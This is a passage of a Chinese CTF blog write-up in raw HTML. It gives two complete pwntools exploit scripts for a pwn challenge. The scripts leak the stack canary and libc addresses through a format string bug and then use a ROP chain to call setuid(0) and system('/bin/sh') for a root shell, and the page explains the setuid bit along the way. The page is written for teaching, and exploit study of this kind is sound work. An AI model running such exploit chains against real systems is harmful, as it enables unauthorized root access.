class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node.nkctf.yuzhian.com.cn&quot;, 38793 )</span></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span> ,arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b $rebase(0x19e8)&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#在这题中由于开启了PIE保护，故要下断点必须加上$rebase()</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Select a option:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;111.0 SSS+&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Select a option:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment">#以上是进入漏洞函数</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;nickname.\n&#x27;</span>,<span class="string">b&#x27;%11$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary =<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary: &#x27;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="comment">#将canary的值暴露出来，方便栈溢出</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;maimai?\n&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"><span class="comment">#为了回到main函数中，随便读入数据进去</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Select a option:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;nickname.\n&#x27;</span>,<span class="string">b&#x27;%33$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_start_main_128=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_start_main_128: &#x27;</span>,<span class="built_in">hex</span>(libc_start_main_128))</span><br><span class="line">libc_start_main=libc_start_main_128-<span class="number">128</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_start_main: &#x27;</span>,<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line"><span class="comment">#将libc_base的值暴露出来，先随便暴露一个函数的got表地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#elo=ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">elo=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">libc_start_main_libc=elo.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;__libc_start_main_libc&#x27;</span>,<span class="built_in">hex</span>(libc_start_main_libc))</span><br><span class="line">open_libc=elo.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;open_libc&#x27;</span>,<span class="built_in">hex</span>(open_libc))</span><br><span class="line">setuid_libc=elo.symbols[<span class="string">&#x27;setuid&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过链接libc库从而找到暴露的函数的偏移量，以及需要的函数的偏移量</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret_libc=<span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi_ret_libc=<span class="number">0x2be51</span></span><br><span class="line">pop_rbp_ret_libc=<span class="number">0x2a2e0</span></span><br><span class="line">pop_rdx_pop_r12_ret_libc=<span class="number">0x11f2e7</span></span><br><span class="line"><span class="comment">#在库中找到的pop指令，便于payload的使用</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base_libc=libc_start_main-libc_start_main_libc</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base_libc&#x27;</span>,<span class="built_in">hex</span>(base_libc))</span><br><span class="line"><span class="built_in">open</span> = open_libc+base_libc</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;open: &#x27;</span>,<span class="built_in">hex</span>(<span class="built_in">open</span>))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=pop_rdi_ret_libc+base_libc</span><br><span class="line">pop_rsi_ret=pop_rsi_ret_libc+base_libc</span><br><span class="line">pop_rbp_ret=pop_rbp_ret_libc+base_libc</span><br><span class="line">pop_rdx_pop_r12_ret=pop_rdx_pop_r12_ret_libc+base_libc</span><br><span class="line"><span class="comment">#确定真实地址</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;maimai?\n&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Select a option:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;nickname.\n&#x27;</span>,<span class="string">b&#x27;%8$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">zhan=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;zhen: &#x27;</span>,<span class="built_in">hex</span>(zhan))</span><br><span class="line">flag=zhan-<span class="number">0x70</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag: &#x27;</span>,<span class="built_in">hex</span>(flag))</span><br><span class="line"><span class="comment">#为了暴露程序指令的真实地址</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;maimai?\n&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Select a option:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;nickname.\n&#x27;</span>,<span class="string">b&#x27;%9$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">cx_libc=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;cx_libc: &#x27;</span>,<span class="built_in">hex</span>(cx_libc))</span><br><span class="line"></span><br><span class="line">cx_base=cx_libc-<span class="number">0x1b25</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;cx_base: &#x27;</span>,<span class="built_in">hex</span>(cx_base))</span><br><span class="line"><span class="comment">#暴露栈地址（这个和上面那个其实都可以不要）</span></span><br><span class="line"></span><br><span class="line">syscall = base_libc + <span class="number">0x0000000000091316</span></span><br><span class="line">pop_rax = base_libc + <span class="number">0x0000000000045eb0</span></span><br><span class="line"></span><br><span class="line">read_cx=<span class="number">0x1150</span></span><br><span class="line">puts_cx=<span class="number">0x1110</span></span><br><span class="line">bss_cx=<span class="number">0x5070</span></span><br><span class="line">leave_cx=<span class="number">0x19E8</span></span><br><span class="line">main_cx=<span class="number">0x1984</span></span><br><span class="line">main=main_cx+cx_base</span><br><span class="line">leave=leave_cx+cx_base</span><br><span class="line"></span><br><span class="line">exe = base_libc + <span class="number">0xebc8</span></span><br><span class="line">puts = cx_base + <span class="number">0x4FB0</span></span><br><span class="line"><span class="built_in">str</span> = base_libc + <span class="built_in">next</span>(elo.search(<span class="built_in">bytes</span>(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line">sys_ = base_libc + elo.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">ret = base_libc + <span class="number">0x29139</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leqave: &#x27;</span>,<span class="built_in">hex</span>(leave))</span><br><span class="line">read_plt=read_cx+cx_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;read_plt: &#x27;</span>,<span class="built_in">hex</span>(read_plt))</span><br><span class="line">puts_plt=puts_cx+cx_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_plt: &#x27;</span>,<span class="built_in">hex</span>(puts_plt))</span><br><span class="line">bss=bss_cx+cx_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;bss: &#x27;</span>,<span class="built_in">hex</span>(bss))</span><br><span class="line"></span><br><span class="line">setuid_libc=elo.symbols[<span class="string">&#x27;setuid&#x27;</span>]</span><br><span class="line">setuid=setuid_libc+base_libc</span><br><span class="line"><span class="comment">#cat os.setuid(0)</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span>+p64(canary)+p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#栈溢出的基本准备，从输入到canary的长度的垃圾数据+canary的值+覆盖ebp的8字节垃圾数据</span></span><br><span class="line"></span><br><span class="line">payload += flat(ret,pop_rdi_ret, <span class="built_in">str</span>, ret,sys_)</span><br><span class="line"><span class="comment">#以此在栈溢出后执行system（/bin/sh）然后获得shell</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;maimai?\n&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>使用如上的脚本然后攻击便可以拿到服务器的shell但是当你直接运行这个拿到shell准备开始读取flag文件是会发现权限不足，并且在其中将chmod等加权的命令禁止，这里便是我看来这道提最为难受的地方，以及拿到shell但由于flag文件的读取需要root权限导致到嘴的鸭子没了，就眼睁睁看着flag文件就在面前却读取不了，当时在比赛中这题我到这里是已经是最后10分钟了，由于我在之前并没有接触过这个东西，因此及时到结束都依然存在flag读不出来这个问题。</p>
<img src="/2024/03/28/hxctf/image-20240328205758246.png" alt="image-20240328205758246" style="zoom:67%;">





<p>后来在学长的指导下才知道这个知识点，也算是收货了一波新知识。</p>
<p>关于这个知识先来看一个点，在拿到shell后由于ls类命令还是可以使用的边可以看看个个文件的权限。用<code>ls -l</code>d的指令</p>
<p><img src="/2024/03/28/hxctf/image-20240325200803566.png" alt="image-20240325200803566"></p>
<p>在这里边更可以看出此时的flag文件只有一个root用户的rw权限，而此时我们的权限只是一个低用户的权限，故我们并不能之前读取这个文件，同时这个里面还将chmod等加权命令禁止了，故必须想其他的办法，我们便从新看看这个各各文件的权限，会发现在pwn这个文件中有一个其他文件都没有的权限s，而pwn正是我们所攻击的文件，或许这个pwn文件的s权限说不定便是一个比较特殊的突破口。</p>
<p>首先来小小的介绍这个s权限是什么（大量源于网上内容，可能不真）</p>
<p>s权限： 设置使文件在执行阶段具有文件所有者的权限，相当于临时拥有文件所有者的身份. 典型的文件是passwd. 如果一般用户执行该文件, 则在执行过程中, 该文件可以获得root权限, 从而可以更改用户的密码.</p>
<p>  举个简单的例子，某个可执行文件foo，如果起所有者为root，在其权限为普通的x的时候，该文件被执行的时候，是以执行该文件的用户权限在执行。但是将其设置为s的时候，该文件被执行就是以root权限来执行了。</p>
<p>s权限的作用：表示对文件具用可执行权限的用户将使用文件拥有者的权限或文件拥有者所在组的权限在对文件进行执行</p>
<p>简单来说就是当一个文件拥有s权限后便可以在通过一下特殊的执行后可以获得root的用户权限</p>
<p>诶，这一听是不是刚刚好，只要我们能通过这个特殊的调用然后执行这个文件不就刚刚好有root权限级的shell从而能读取flag的内容，可是问题在于这个特殊的调用是什么？</p>
<p>正是<strong>setuid 位</strong></p>
<p>当使用 setuid （设置用户 ID）位时，之前描述的行为会有所变化，所以当一个可执行文件启动时，它不会以启动它的用户的权限运行，而是<strong>以该文件所有者的权限运行</strong>。所以，如果在一个可执行文件上设置了 setuid 位，并且该文件由 root 拥有，当一个普通用户启动它时，它将以 root 权限运行。显然，如果 setuid 位使用不当的话，会带来潜在的安全风险。</p>
<p>使用 setuid 权限的可执行文件的例子是 <code>passwd</code>，我们可以使用该程序更改登录密码。我们可以通过使用 <code>ls</code> 命令来验证：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l /bin/passwd</span><br><span class="line">-rwsr-xr-x. 1 root root 27768 Feb 11 2017 /bin/passwd</span><br></pre></td></tr></table></figure>



<p>简单来说就是，就是使用setuid函数，准确来说便是在栈溢出后执行setuid（0），然后再执行system（&#x2F;bin&#x2F;sh）</p>
<p>便可以拿到有root级的shell，而这个setuid函数可以直接在libc库中寻找</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elo=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">setuid_libc=elo.symbols[<span class="string">&#x27;setuid&#x27;</span>]    </span><br><span class="line">setuid=setuid_libc+base_libc</span><br><span class="line">payload=flat(pop_rdi_ret,<span class="number">0</span>,stuid,用于拿到shell的过程)   </span><br></pre></td></tr></table></figure>



<p>因此这道题的完整版exp为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node.nkctf.yuzhian.com.cn&quot;, 38793 )</span></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span> ,arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b $rebase(0x19e8)&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#在这题中由于开启了PIE保护，故要下断点必须加上$rebase()</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Select a option:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;111.0 SSS+&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Select a option:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment">#以上是进入漏洞函数</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;nickname.\n&#x27;</span>,<span class="string">b&#x27;%11$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary =<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary: &#x27;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="comment">#将canary的值暴露出来，方便栈溢出</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;maimai?\n&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"><span class="comment">#为了回到main函数中，随便读入数据进去</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Select a option:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;nickname.\n&#x27;</span>,<span class="string">b&#x27;%33$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_start_main_128=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_start_main_128: &#x27;</span>,<span class="built_in">hex</span>(libc_start_main_128))</span><br><span class="line">libc_start_main=libc_start_main_128-<span class="number">128</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_start_main: &#x27;</span>,<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line"><span class="comment">#将libc_base的值暴露出来，先随便暴露一个函数的got表地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#elo=ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">elo=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">libc_start_main_libc=elo.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;__libc_start_main_libc&#x27;</span>,<span class="built_in">hex</span>(libc_start_main_libc))</span><br><span class="line">open_libc=elo.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;open_libc&#x27;</span>,<span class="built_in">hex</span>(open_libc))</span><br><span class="line">setuid_libc=elo.symbols[<span class="string">&#x27;setuid&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过链接libc库从而找到暴露的函数的偏移量，以及需要的函数的偏移量</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret_libc=<span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi_ret_libc=<span class="number">0x2be51</span></span><br><span class="line">pop_rbp_ret_libc=<span class="number">0x2a2e0</span></span><br><span class="line">pop_rdx_pop_r12_ret_libc=<span class="number">0x11f2e7</span></span><br><span class="line"><span class="comment">#在库中找到的pop指令，便于payload的使用</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base_libc=libc_start_main-libc_start_main_libc</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base_libc&#x27;</span>,<span class="built_in">hex</span>(base_libc))</span><br><span class="line"><span class="built_in">open</span> = open_libc+base_libc</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;open: &#x27;</span>,<span class="built_in">hex</span>(<span class="built_in">open</span>))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=pop_rdi_ret_libc+base_libc</span><br><span class="line">pop_rsi_ret=pop_rsi_ret_libc+base_libc</span><br><span class="line">pop_rbp_ret=pop_rbp_ret_libc+base_libc</span><br><span class="line">pop_rdx_pop_r12_ret=pop_rdx_pop_r12_ret_libc+base_libc</span><br><span class="line"><span class="comment">#确定真实地址</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;maimai?\n&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Select a option:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;nickname.\n&#x27;</span>,<span class="string">b&#x27;%8$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">zhan=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;zhen: &#x27;</span>,<span class="built_in">hex</span>(zhan))</span><br><span class="line">flag=zhan-<span class="number">0x70</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag: &#x27;</span>,<span class="built_in">hex</span>(flag))</span><br><span class="line"><span class="comment">#为了暴露程序指令的真实地址</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;maimai?\n&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Select a option:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;nickname.\n&#x27;</span>,<span class="string">b&#x27;%9$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">cx_libc=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;cx_libc: &#x27;</span>,<span class="built_in">hex</span>(cx_libc))</span><br><span class="line"></span><br><span class="line">cx_base=cx_libc-<span class="number">0x1b25</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;cx_base: &#x27;</span>,<span class="built_in">hex</span>(cx_base))</span><br><span class="line"><span class="comment">#暴露栈地址（这个和上面那个其实都可以不要）</span></span><br><span class="line"></span><br><span class="line">syscall = base_libc + <span class="number">0x0000000000091316</span></span><br><span class="line">pop_rax = base_libc + <span class="number">0x0000000000045eb0</span></span><br><span class="line"></span><br><span class="line">read_cx=<span class="number">0x1150</span></span><br><span class="line">puts_cx=<span class="number">0x1110</span></span><br><span class="line">bss_cx=<span class="number">0x5070</span></span><br><span class="line">leave_cx=<span class="number">0x19E8</span></span><br><span class="line">main_cx=<span class="number">0x1984</span></span><br><span class="line">main=main_cx+cx_base</span><br><span class="line">leave=leave_cx+cx_base</span><br><span class="line"></span><br><span class="line">exe = base_libc + <span class="number">0xebc8</span></span><br><span class="line">puts = cx_base + <span class="number">0x4FB0</span></span><br><span class="line"><span class="built_in">str</span> = base_libc + <span class="built_in">next</span>(elo.search(<span class="built_in">bytes</span>(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line">sys_ = base_libc + elo.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">ret = base_libc + <span class="number">0x29139</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leqave: &#x27;</span>,<span class="built_in">hex</span>(leave))</span><br><span class="line">read_plt=read_cx+cx_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;read_plt: &#x27;</span>,<span class="built_in">hex</span>(read_plt))</span><br><span class="line">puts_plt=puts_cx+cx_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_plt: &#x27;</span>,<span class="built_in">hex</span>(puts_plt))</span><br><span class="line">bss=bss_cx+cx_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;bss: &#x27;</span>,<span class="built_in">hex</span>(bss))</span><br><span class="line"></span><br><span class="line">setuid_libc=elo.symbols[<span class="string">&#x27;setuid&#x27;</span>]</span><br><span class="line">setuid=setuid_libc+base_libc</span><br><span class="line"><span class="comment">#cat os.setuid(0)</span></span><br><span class="line"><span class="comment">#获得setuid函数的地址</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span>+p64(canary)+p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#栈溢出的基本准备，从输入到canary的长度的垃圾数据+canary的值+覆盖ebp的8字节垃圾数据</span></span><br><span class="line"></span><br><span class="line">payload += flat(ret,pop_rdi_ret,<span class="number">0</span>,setuid,pop_rdi_ret, <span class="built_in">str</span>, ret,sys_)</span><br><span class="line"><span class="comment">#以此在栈溢出后先执行setuid(0)，然后在执行system（/bin/sh）然后获得root级shell，便可以直接用cat flag将flag读出来</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;maimai?\n&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>终于写完关于这道题的wp，虽然有的地方比较省，不过那些都是一些比较基本的东西，应该都能看懂的吧。</p>
<p>做了一天，wp一天，所幸还是有所收获，这就好，前途漫漫亦灿灿。</p>
<p><img src="/2024/03/28/hxctf/image-20240328214024472.png" alt="image-20240328214024472"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn%E9%A2%98%E8%A7%A3/" rel="tag">pwn题解</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/CTF/">CTF</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-博客之痛" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/03/27/%E5%8D%9A%E5%AE%A2%E4%B9%8B%E7%97%9B/" class="article-date">
  	<time datetime="2024-03-27T13:27:07.000Z" itemprop="datePublished">2024-03-27</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/03/27/%E5%8D%9A%E5%AE%A2%E4%B9%8B%E7%97%9B/">
        博客之痛
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>历时三天终于把这个破博客给搭出来了</p>
<p>地址：<a href="https://2023478.github.io/">纲的blog (2023478.github.io)</a></p>
<p><img src="/2024/03/27/%E5%8D%9A%E5%AE%A2%E4%B9%8B%E7%97%9B/image-20240327213022031-17115462250291.png" alt="image-20240327213022031"><img src="/2024/03/27/%E5%8D%9A%E5%AE%A2%E4%B9%8B%E7%97%9B/image-20240327213044821.png" alt="image-20240327213044821"></p>
